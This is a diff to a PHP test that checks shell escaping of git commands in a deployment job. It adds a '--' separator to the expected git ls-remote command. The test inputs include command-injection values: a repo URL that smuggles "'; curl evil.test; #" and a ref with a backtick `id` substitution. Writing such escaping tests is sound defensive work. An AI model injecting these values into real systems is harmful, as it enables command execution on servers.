@@ -293,6 +293,7 @@ describe('deployment git command escaping', function () {
         foreach ([
             'application' => new Application,
             'customPort' => 22,
+            'deployment_uuid' => 'deploy-uuid',
             'fullRepoUrl' => "git@example.com:org/repo.git'; curl evil.test; #",
         ] as $property => $value) {
             $reflectionProperty = $job->getProperty($property);
@@ -306,7 +307,7 @@ describe('deployment git command escaping', function () {
         $command = $method->invoke($instance, 'refs/heads/main`id`', '/root/.ssh/id_rsa');
 
         expect($command)
-            ->toContain("git ls-remote 'git@example.com:org/repo.git'\\''; curl evil.test; #' 'refs/heads/main`id`'")
+            ->toContain("git ls-remote -- 'git@example.com:org/repo.git'\\''; curl evil.test; #' 'refs/heads/main`id`'")
             ->toContain('-i /root/.ssh/id_rsa')
             ->not->toContain('repo.git; curl');
     });
